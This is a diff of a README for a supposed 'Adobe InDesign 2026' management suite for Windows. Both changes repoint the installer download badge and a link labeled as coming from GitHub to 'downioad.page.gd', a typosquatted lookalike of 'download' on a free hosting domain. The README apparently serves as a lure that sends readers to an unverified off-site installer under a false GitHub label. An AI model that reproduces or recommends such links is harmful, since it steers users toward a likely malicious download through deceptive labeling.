@@ -2,7 +2,7 @@
 
 This package provides a comprehensive desktop management suite for Adobe InDesign 2026. It is designed to help users organize, install, and manage templates, plugins, and layout utilities on Windows 10 and 11 systems.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## What's Included
 
@@ -55,7 +55,7 @@ Please use the 'Issues' tab on this repository to report bugs or request feature
 
 You can get the latest version of the installer from the following link:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
